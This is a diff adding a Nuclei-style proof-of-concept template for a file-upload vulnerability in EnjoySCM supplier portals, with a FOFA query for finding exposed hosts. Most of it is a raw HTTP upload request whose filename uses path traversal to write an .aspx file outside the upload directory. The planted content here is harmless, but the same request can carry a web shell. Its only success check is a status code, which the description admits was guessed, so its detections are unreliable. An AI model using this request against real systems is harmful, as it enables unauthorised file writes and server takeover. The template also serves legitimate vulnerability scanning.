@@ -1,0 +1,70 @@
+id: poc-ozrdxw5v92is4gs0
+info:
+  name: EnjoySCM存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ozrdxw5v92is4gs0
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ozrdxw5v92is4gs0
+    fofa: title=”供应商网上服务厅”
+http:
+- raw:
+  - 'POST /File/UploadFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394
+
+    Content-Length: 460
+
+    Connection: close
+
+    Cookie:
+
+    Sec-Fetch-Dest: empty
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Site: same-origin
+
+
+    -----------------------------21909179191068471382830692394
+
+    Content-Disposition: form-data; name="file"; filename="../../../0301.aspx"
+
+    Content-Type: image/jpeg
+
+
+    Hello Word!
+
+    -----------------------------21909179191068471382830692394
+
+    Content-Disposition: form-data; name="action"
+
+
+    unloadfile
+
+    -----------------------------21909179191068471382830692394
+
+    Content-Disposition: form-data; name="filepath"
+
+
+
+    -----------------------------21909179191068471382830692394'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
